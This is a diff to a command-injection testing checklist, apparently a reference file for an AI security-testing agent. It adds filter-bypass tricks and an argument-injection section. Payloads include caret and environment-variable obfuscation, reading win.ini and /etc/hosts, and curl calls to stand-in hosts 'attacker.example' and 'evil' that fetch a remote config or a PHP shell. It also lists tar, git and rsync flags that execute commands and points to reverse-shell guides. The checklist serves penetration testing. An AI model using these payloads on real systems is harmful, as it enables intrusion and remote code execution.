@@ -60,7 +60,8 @@ origin: AI Threat Hunting
 - [ ] Separators: `&`, `&&`, `|`, `||`
 - [ ] Command: `& dir`, `| type C:\windows\win.ini`
 - [ ] Bypass: `^` caret insertion → `w^h^o^a^m^i`
-- [ ] Env variable slicing: `%COMSPEC:~-16,1%%COMSPEC:~-1%` = `ec` (for echo)
+- [ ] Env variable slicing: `%COMSPEC:~6,1%%COMSPEC:~23,1%` extracts chars from `C:\WINDOWS\system32\cmd.exe`
+- [ ] Alternative: `set /a` arithmetic, `for /F` token extraction to build commands from env
 
 ### 6. Exploitation
 
@@ -70,7 +71,15 @@ origin: AI Threat Hunting
 - [ ] Enumerate internal network: `; ifconfig`, `; cat /etc/hosts`
 - [ ] Pivot: `; curl http://internal-service/`
 
-### 7. Context-Specific Checks
+### 7. Argument Injection
+
+When input is passed as an argument to a program (not through shell), test flag injection:
+- [ ] `--output=/tmp/evil` or `-o /tmp/evil` — write to attacker-controlled path
+- [ ] `--config=http://attacker.example/evil.conf` — load remote config
+- [ ] Programs with dangerous flags: `tar --checkpoint-action=exec=CMD`, `git -c core.sshCommand=CMD`, `curl -o /tmp/shell.php http://evil/`, `rsync -e 'ssh -o ProxyCommand=CMD'`, `find -exec CMD`
+- [ ] Prefix with `--` to terminate option parsing, then inject as positional arg
+
+### 8. Context-Specific Checks
 
 - [ ] Inside quotes: escape with `"`, then inject
 - [ ] Inside `$(...)`: nest commands
@@ -90,6 +99,5 @@ origin: AI Threat Hunting
 ## Extended Resources
 
 - `agent/references/payloads/command-injection-payloads.md` — blind detection, filter bypass, Linux/Windows, argument injection
-- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
 - `agent/references/offensive-tactics/shell-handling.md` — pwncat-vl listener setup, tmux sessions, reverse shell payloads (required when exploitation reaches RCE)
 - `agent/references/offensive-tactics/frp-tunneling.md` — frp tunnel exposure, OOB callback setup (required for remote targets)
